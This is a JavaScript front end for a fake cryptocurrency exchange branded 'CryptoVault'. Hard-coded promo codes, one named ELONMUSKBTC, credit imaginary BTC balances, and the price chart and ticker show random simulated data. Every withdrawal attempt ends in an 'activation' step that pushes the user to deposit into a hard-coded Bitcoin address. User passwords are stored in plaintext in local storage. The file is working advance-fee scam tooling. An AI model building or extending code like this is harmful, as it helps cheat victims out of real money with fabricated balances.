// Global variables
let currentUser = null
let BTC_PRICE = 119329.21; // Will be updated with real market value // Fixed BTC price for demo

// Promo codes and their BTC rewards
const PROMO_CODES = {
  ELONMUSKBTC: 1.3,
  CBLSUPPORT: 2.05,
  CBL001: 3.55,
}

// Initialize app
document.addEventListener("DOMContentLoaded", () => {
  console.log("DOM loaded, current path:", window.location.pathname)

  if (window.location.pathname.includes("dashboard.html")) {
    initDashboard()
  } else {
    initAuth()
  }
})

// Authentication functions
function initAuth() {
  console.log("Initializing auth...")

  // Check if user is already logged in
  const loggedInUser = localStorage.getItem("cryptovault_current_user")
  if (loggedInUser) {
    console.log("User already logged in:", loggedInUser)
    window.location.href = "dashboard.html"
    return
  }

  const loginFormElement = document.getElementById("loginFormElement")
  const registerFormElement = document.getElementById("registerFormElement")

  if (loginFormElement) {
    loginFormElement.addEventListener("submit", handleLogin)
    console.log("Login form listener added")
  }

  if (registerFormElement) {
    registerFormElement.addEventListener("submit", handleRegister)
    console.log("Register form listener added")
  }

  // Start with register form active
  switchToRegister()
}

function switchToRegister() {
  console.log("Switching to register form")
  const loginForm = document.getElementById("loginForm")
  const landingPage = document.getElementById("landingPage")

  if (loginForm) loginForm.classList.remove("active")
  if (landingPage) landingPage.classList.add("active")
}

function switchToLogin() {
  console.log("Switching to login form")
  const loginForm = document.getElementById("loginForm")
  const landingPage = document.getElementById("landingPage")

  if (landingPage) landingPage.classList.remove("active")
  if (loginForm) loginForm.classList.add("active")
}

function handleLogin(e) {
  e.preventDefault()
  console.log("Login form submitted")

  const email = document.getElementById("loginEmail").value.trim()
  const password = document.getElementById("loginPassword").value

  console.log("Login attempt for email:", email)

  if (!email || !password) {
    showNotification("Please fill in all fields!", "error")
    return
  }

  const users = JSON.parse(localStorage.getItem("cryptovault_users") || "{}")
  console.log("Stored users:", Object.keys(users))

  // Find user by email
  const userEntry = Object.entries(users).find(([key, userData]) => {
    console.log("Checking user:", key, "email:", userData.email)
    return userData.email === email && userData.password === password
  })

  if (userEntry) {
    const [userKey] = userEntry
    console.log("Login successful for user:", userKey)

    currentUser = userKey
    localStorage.setItem("cryptovault_current_user", userKey)

    showNotification("Login successful! Redirecting...", "success")

    setTimeout(() => {
      console.log("Redirecting to dashboard...")
      window.location.href = "dashboard.html"
    }, 1000)
  } else {
    console.log("Login failed - invalid credentials")
    showNotification("Invalid email or password!", "error")
  }
}

function handleRegister(e) {
  e.preventDefault()
  console.log("Register form submitted")

  const email = document.getElementById("registerEmail").value.trim()
  const password = document.getElementById("registerPassword").value
  const confirmPassword = document.getElementById("confirmPassword").value
  const termsChecked = document.getElementById("termsCheck").checked

  console.log("Registration attempt for email:", email)

  if (!email || !password || !confirmPassword) {
    showNotification("Please fill in all fields!", "error")
    return
  }

  if (password !== confirmPassword) {
    showNotification("Passwords do not match!", "error")
    return
  }

  if (!termsChecked) {
    showNotification("You must agree to the terms!", "error")
    return
  }

  if (password.length < 6) {
    showNotification("Password must be at least 6 characters!", "error")
    return
  }

  const users = JSON.parse(localStorage.getItem("cryptovault_users") || "{}")

  // Check if email already exists
  const emailExists = Object.values(users).some((userData) => userData.email === email)
  if (emailExists) {
    showNotification("Email already exists!", "error")
    return
  }

  // Create username from email (before @ symbol)
  const username = email.split("@")[0]
  let finalUsername = username
  let counter = 1

  // Make sure username is unique
  while (users[finalUsername]) {
    finalUsername = `${username}${counter}`
    counter++
  }

  users[finalUsername] = {
    email: email,
    password: password,
    btcBalance: 0.0,
    redeemedCodes: [],
    createdAt: new Date().toISOString(),
  }

  localStorage.setItem("cryptovault_users", JSON.stringify(users))
  console.log("User registered successfully:", finalUsername)

  showNotification("Account created successfully! Please sign in.", "success")

  // Clear form
  document.getElementById("registerFormElement").reset()

  setTimeout(() => {
    switchToLogin()
  }, 1500)
}

// Dashboard functions
function initDashboard() {
  console.log("Initializing dashboard...")

  currentUser = localStorage.getItem("cryptovault_current_user")
  console.log("Current user from storage:", currentUser)

  if (!currentUser) {
    console.log("No current user found, redirecting to login")
    window.location.href = "index.html"
    return
  }

  const users = JSON.parse(localStorage.getItem("cryptovault_users") || "{}")
  if (!users[currentUser]) {
    console.log("User data not found, redirecting to login")
    localStorage.removeItem("cryptovault_current_user")
    window.location.href = "index.html"
    return
  }

  console.log("Dashboard initialized successfully for user:", currentUser)
  updateDashboard()

  // Initialize other dashboard features if elements exist
  const tradingChart = document.getElementById("tradingChart")
  if (tradingChart) {
    initTradingChart()
  }

  // Update BTC price periodically
  setInterval(updateBTCPrice, 5000)

  // Add event listener for amount input
  const amountInput = document.getElementById("withdrawAmount")
  if (amountInput) {
    amountInput.addEventListener("input", updateWithdrawAmountDisplay)
  }
}

function updateDashboard() {
  const users = JSON.parse(localStorage.getItem("cryptovault_users") || "{}")
  const userData = users[currentUser]

  if (!userData) {
    logout()
    return
  }

  console.log("Updating dashboard for user:", currentUser, "Balance:", userData.btcBalance)

  // Update balance displays
  const btcBalanceElements = document.querySelectorAll(
    "#btcBalance, #spotBalance, #btcSpotBalance, #btcAvailableBalance, #btcTotalBalance",
  )
  btcBalanceElements.forEach((element) => {
    if (element) {
      element.textContent =
        userData.btcBalance.toFixed(6) +
        (element.id.includes("spot") || element.id.includes("Total") || element.id.includes("Available") ? " BTC" : "")
    }
  })

  const usdValue = (userData.btcBalance * BTC_PRICE).toFixed(2)
  const usdBalanceElement = document.getElementById("usdBalance")
  if (usdBalanceElement) {
    usdBalanceElement.textContent = usdValue
  }

  // Update spot balance USD display
  const spotUsdElements = document.querySelectorAll(".spot-usd, .balance-usd-small")
  spotUsdElements.forEach((element) => {
    if (element) {
      element.textContent = `$${usdValue}`
    }
  })
}

function redeemPromoCode() {
  console.log("🎯 PROMO CODE FUNCTION CALLED")

  const promoCodeInput = document.getElementById("promoCode")
  if (!promoCodeInput) {
    console.log("❌ Promo code input not found")
    return
  }

  const promoCode = promoCodeInput.value.trim()
  console.log("🔍 Promo code entered:", promoCode)

  if (!promoCode) {
    console.log("⚠️ Empty promo code")
    showNotification("Please enter a promo code!", "error")
    return
  }

  const users = JSON.parse(localStorage.getItem("cryptovault_users") || "{}")
  const userData = users[currentUser]

  if (!userData) {
    console.log("❌ User data not found")
    logout()
    return
  }

  console.log("📋 User redeemed codes:", userData.redeemedCodes)
  console.log("🎁 Available promo codes:", Object.keys(PROMO_CODES))

  if (userData.redeemedCodes.includes(promoCode)) {
    console.log("🚫 Promo code already used")
    showNotification("Promo code already used!", "error")
    return
  }

  if (PROMO_CODES[promoCode]) {
    const btcReward = PROMO_CODES[promoCode]
    console.log("✅ Valid promo code, reward:", btcReward)

    userData.btcBalance += btcReward
    userData.redeemedCodes.push(promoCode)

    localStorage.setItem("cryptovault_users", JSON.stringify(users))

    showNotification(`🎉 Success! ${btcReward} BTC added to your account!`, "success")
    promoCodeInput.value = ""
    updateDashboard()
  } else {
    console.log("❌ Invalid promo code")
    showNotification("Invalid promo code!", "error")
  }
}

// Modal functions
function showDepositModal() {
  const modal = document.getElementById("depositModal")
  if (modal) {
    modal.style.display = "block"
  }
}

function closeDepositModal() {
  const modal = document.getElementById("depositModal")
  if (modal) {
    modal.style.display = "none"
  }
}

// Withdrawal flow variables
let selectedWalletType = ""
let selectedCoin = ""
let currentWithdrawStep = 1

// Enhanced withdrawal functions
function showWithdrawModal() {
  const modal = document.getElementById("withdrawModal")
  if (modal) {
    modal.style.display = "block"
    resetWithdrawFlow()
  }
}

function resetWithdrawFlow() {
  currentWithdrawStep = 1
  selectedWalletType = ""
  selectedCoin = ""
  goToWithdrawStep(1)

  // Reset form fields
  const walletAddress = document.getElementById("walletAddress")
  const withdrawAmount = document.getElementById("withdrawAmount")
  const networkSelect = document.getElementById("networkSelect")
  const saveAddress = document.getElementById("saveAddress")

  if (walletAddress) walletAddress.value = ""
  if (withdrawAmount) withdrawAmount.value = ""
  if (networkSelect) networkSelect.value = ""
  if (saveAddress) saveAddress.checked = false
}

function goToWithdrawStep(step) {
  // Hide all steps
  for (let i = 1; i <= 4; i++) {
    const stepElement = document.getElementById(`withdrawStep${i}`)
    if (stepElement) {
      stepElement.classList.remove("active")
    }
  }

  // Show current step
  const currentStepElement = document.getElementById(`withdrawStep${step}`)
  if (currentStepElement) {
    currentStepElement.classList.add("active")
  }

  // Update modal title
  const titles = {
    1: "Select Withdrawal Method",
    2: "Select Cryptocurrency",
    3: "Enter Wallet Details",
    4: "Confirm Withdrawal",
  }

  const titleElement = document.getElementById("withdrawModalTitle")
  if (titleElement) {
    titleElement.textContent = titles[step] || "Withdraw Funds"
  }

  currentWithdrawStep = step

  // Update balance display for step 4
  if (step === 4) {
    updateWithdrawBalanceDisplay()
  }
}

function selectWalletType(type) {
  selectedWalletType = type

  if (type === "crypto") {
    goToWithdrawStep(2)
  } else {
    // For non-crypto methods, show activation modal
    closeWithdrawModal()
    showActivationModal()
  }
}

function selectCoin(coin) {
  selectedCoin = coin

  // Update the wallet address title
  const titleElement = document.getElementById("selectedCoinTitle")
  if (titleElement) {
    titleElement.textContent = `${coin} WALLET ADDRESS`
  }

  // Update network options based on selected coin
  updateNetworkOptions(coin)

  goToWithdrawStep(3)
}

function updateNetworkOptions(coin) {
  const networkSelect = document.getElementById("networkSelect")
  if (!networkSelect) return

  networkSelect.innerHTML = '<option value="">Select network...</option>'

  if (coin === "BTC") {
    networkSelect.innerHTML += `
      <option value="BITCOIN">Bitcoin Network</option>
      <option value="BEP20">BEP20 (BSC)</option>
    `
  } else if (coin === "ETH") {
    networkSelect.innerHTML += `
      <option value="ETHEREUM">Ethereum Network</option>
      <option value="BEP20">BEP20 (BSC)</option>
      <option value="POLYGON">Polygon Network</option>
    `
  }
}

function updateWithdrawBalanceDisplay() {
  const users = JSON.parse(localStorage.getItem("cryptovault_users") || "{}")
  const userData = users[currentUser]

  if (!userData) return

  const balance = userData.btcBalance
  const usdValue = (balance * BTC_PRICE).toFixed(2)

  // Update balance displays
  const balanceElement = document.getElementById("availableWithdrawBalance")
  const btcWithdrawBalance = document.getElementById("btcWithdrawBalance")

  if (balanceElement) {
    balanceElement.textContent = `${balance.toFixed(6)} ${selectedCoin}`
  }

  if (btcWithdrawBalance) {
    btcWithdrawBalance.textContent = `${balance.toFixed(6)} BTC`
  }

  // Update currency label
  const currencyLabel = document.getElementById("withdrawCurrency")
  if (currencyLabel) {
    currencyLabel.textContent = selectedCoin
  }
}

function setMaxAmount() {
  const users = JSON.parse(localStorage.getItem("cryptovault_users") || "{}")
  const userData = users[currentUser]

  if (!userData) return

  const maxAmount = userData.btcBalance - 0.00005 // Subtract network fee
  const amountInput = document.getElementById("withdrawAmount")

  if (amountInput && maxAmount > 0) {
    amountInput.value = maxAmount.toFixed(6)
    updateWithdrawAmountDisplay()
  }
}

function updateWithdrawAmountDisplay() {
  const amountInput = document.getElementById("withdrawAmount")
  const amountUSD = document.getElementById("withdrawAmountUSD")
  const finalReceiveAmount = document.getElementById("finalReceiveAmount")

  if (!amountInput) return

  const amount = Number.parseFloat(amountInput.value) || 0
  const usdValue = (amount * BTC_PRICE).toFixed(2)
  const networkFee = 0.00005
  const finalAmount = Math.max(0, amount - networkFee)

  if (amountUSD) {
    amountUSD.textContent = `$${usdValue}`
  }

  if (finalReceiveAmount) {
    finalReceiveAmount.textContent = `${finalAmount.toFixed(6)} ${selectedCoin}`
  }
}

function showActivationModal() {
  const modal = document.getElementById("activationModal")
  if (modal) {
    modal.style.display = "block"
    updateActivationStatus()
  }
}

function updateActivationStatus() {
  const users = JSON.parse(localStorage.getItem("cryptovault_users") || "{}")
  const userData = users[currentUser]

  if (!userData) return

  const minimumDeposit = 0.00063
  const currentDepositElement = document.getElementById("currentDeposit")

  if (currentDepositElement) {
    currentDepositElement.textContent = userData.btcBalance.toFixed(6)
  }
}

function closeWithdrawModal() {
  const modal = document.getElementById("withdrawModal")
  if (modal) {
    modal.style.display = "none"
  }
}

function showTransferModal() {
  // Show activation modal instead for demo purposes
  showActivationModal()
}

function closeActivationModal() {
  const modal = document.getElementById("activationModal")
  if (modal) {
    modal.style.display = "none"
  }
  // After closing activation modal, show deposit modal
  showDepositModal()
}

function copyAddress() {
  const address = "1J8Be2eVqDAvEQDqRqPfropJSrmxLZYG"
  navigator.clipboard
    .writeText(address)
    .then(() => {
      showNotification("Address copied to clipboard!", "success")
    })
    .catch(() => {
      showNotification("Failed to copy address", "error")
    })
}

function logout() {
  console.log("Logging out user:", currentUser)
  localStorage.removeItem("cryptovault_current_user")
  currentUser = null
  window.location.href = "index.html"
}

// Trading chart functions
function initTradingChart() {
  const canvas = document.getElementById("tradingChart")
  if (!canvas) return

  const ctx = canvas.getContext("2d")
  const width = canvas.width
  const height = canvas.height

  // Generate fake price data
  const dataPoints = 50
  const priceData = []
  let currentPrice = BTC_PRICE

  for (let i = 0; i < dataPoints; i++) {
    const change = (Math.random() - 0.5) * 1000
    currentPrice += change
    priceData.push(currentPrice)
  }

  // Draw chart
  ctx.clearRect(0, 0, width, height)
  ctx.strokeStyle = "#00ff88"
  ctx.lineWidth = 2
  ctx.beginPath()

  const minPrice = Math.min(...priceData)
  const maxPrice = Math.max(...priceData)
  const priceRange = maxPrice - minPrice

  for (let i = 0; i < priceData.length; i++) {
    const x = (i / (priceData.length - 1)) * width
    const y = height - ((priceData[i] - minPrice) / priceRange) * height

    if (i === 0) {
      ctx.moveTo(x, y)
    } else {
      ctx.lineTo(x, y)
    }
  }

  ctx.stroke()

  // Add glow effect
  ctx.shadowColor = "#00ff88"
  ctx.shadowBlur = 10
  ctx.stroke()
}

function updateBTCPrice() {
  const priceElement = document.getElementById("btcPrice")
  if (!priceElement) return

  // Simulate price changes
  const change = (Math.random() - 0.5) * 100
  const newPrice = BTC_PRICE + change

  priceElement.textContent = `$${newPrice.toFixed(2)}`

  // Update price change indicator
  const changeElement = document.querySelector(".price-change")
  if (changeElement) {
    const changePercent = ((change / BTC_PRICE) * 100).toFixed(2)
    changeElement.textContent = `${changePercent >= 0 ? "+" : ""}${changePercent}%`
    changeElement.className = `price-change ${changePercent >= 0 ? "positive" : "negative"}`
  }
}

// ENHANCED NOTIFICATION SYSTEM - GUARANTEED TO WORK ON MOBILE
function showNotification(message, type = "info") {
  console.log("🚨 SHOWING NOTIFICATION:", type, message)

  // Remove any existing notification first
  const existingNotification = document.getElementById("notification")
  if (existingNotification) {
    existingNotification.remove()
  }

  // Create new notification element
  const notification = document.createElement("div")
  notification.id = "notification"
  notification.className = `notification ${type}`
  notification.textContent = message

  // Add to body
  document.body.appendChild(notification)

  console.log("📱 Notification element created and added to DOM")

  // Force reflow
  notification.offsetHeight

  // Show notification
  setTimeout(() => {
    notification.classList.add("show")
    console.log("✅ Notification should now be visible")
  }, 100)

  // Hide after 5 seconds
  setTimeout(() => {
    notification.classList.remove("show")
    setTimeout(() => {
      if (notification && notification.parentNode) {
        notification.remove()
      }
    }, 400)
  }, 5000)
}

// Password toggle function
function togglePassword(fieldId) {
  const field = document.getElementById(fieldId)
  if (field) {
    field.type = field.type === "password" ? "text" : "password"
  }
}

function processWithdraw() {
  console.log("💰 PROCESS WITHDRAW CALLED")

  const users = JSON.parse(localStorage.getItem("cryptovault_users") || "{}")
  const userData = users[currentUser]

  if (!userData) {
    console.log("❌ User data not found")
    logout()
    return
  }

  // Get withdrawal details
  const walletAddressInput = document.getElementById("walletAddress")
  const withdrawAmountInput = document.getElementById("withdrawAmount")
  const networkSelectInput = document.getElementById("networkSelect")

  if (!walletAddressInput || !withdrawAmountInput || !networkSelectInput) {
    console.log("❌ Form elements not found")
    showNotification("Form elements not found!", "error")
    return
  }

  const walletAddress = walletAddressInput.value.trim()
  const withdrawAmount = Number.parseFloat(withdrawAmountInput.value) || 0
  const networkSelect = networkSelectInput.value

  console.log("📋 Withdrawal details:", { walletAddress, withdrawAmount, networkSelect })

  // Validation
  if (!walletAddress) {
    showNotification("Please enter a wallet address!", "error")
    return
  }

  if (!networkSelect) {
    showNotification("Please select a network!", "error")
    return
  }

  if (withdrawAmount <= 0) {
    showNotification("Please enter a valid amount!", "error")
    return
  }

  // ALWAYS show activation modal first
  console.log("🔄 Showing activation modal")
  closeWithdrawModal()

  // Small delay to ensure modal closes properly
  setTimeout(() => {
    showActivationModal()
  }, 200)
}

function showVerificationModal(amount, address, network) {
  console.log("🔐 Showing verification modal with:", { amount, address, network })

  const modal = document.getElementById("verificationModal")
  if (modal) {
    // Update verification details
    const verifyAmountElement = document.getElementById("verifyAmount")
    const verifyAddressElement = document.getElementById("verifyAddress")
    const verifyNetworkElement = document.getElementById("verifyNetwork")

    if (verifyAmountElement) {
      verifyAmountElement.textContent = amount.toFixed(6) + " " + selectedCoin
    }
    if (verifyAddressElement) {
      verifyAddressElement.textContent = address
    }
    if (verifyNetworkElement) {
      verifyNetworkElement.textContent = network
    }

    modal.style.display = "block"
    console.log("✅ Verification modal displayed")
  } else {
    console.log("❌ Verification modal not found")
  }
}

function closeVerificationModal() {
  const modal = document.getElementById("verificationModal")
  if (modal) {
    modal.style.display = "none"
  }
}

function confirmWithdrawal() {
  console.log("✅ Confirm withdrawal function called")

  const users = JSON.parse(localStorage.getItem("cryptovault_users") || "{}")
  const userData = users[currentUser]

  if (!userData) {
    logout()
    return
  }

  const withdrawAmountInput = document.getElementById("withdrawAmount")
  if (!withdrawAmountInput) {
    showNotification("Withdrawal amount not found!", "error")
    return
  }

  const withdrawAmount = Number.parseFloat(withdrawAmountInput.value) || 0
  const networkFee = 0.00005
  const totalDeducted = withdrawAmount + networkFee

  console.log("💸 Confirming withdrawal:", { withdrawAmount, networkFee, totalDeducted })

  // Deduct from user balance
  userData.btcBalance -= totalDeducted

  // Save updated balance
  localStorage.setItem("cryptovault_users", JSON.stringify(users))

  // Close verification modal
  closeVerificationModal()

  // Show success message
  showNotification("🎉 Verification successful! Withdrawal completed.", "success")

  // Update dashboard
  updateDashboard()

  // Reset withdrawal form
  resetWithdrawFlow()
}

// Close modals when clicking outside
window.onclick = (event) => {
  const modals = ["depositModal", "withdrawModal", "activationModal", "verificationModal"]
  modals.forEach((modalId) => {
    const modal = document.getElementById(modalId)
    if (modal && event.target === modal) {
      modal.style.display = "none"
    }
  })
}
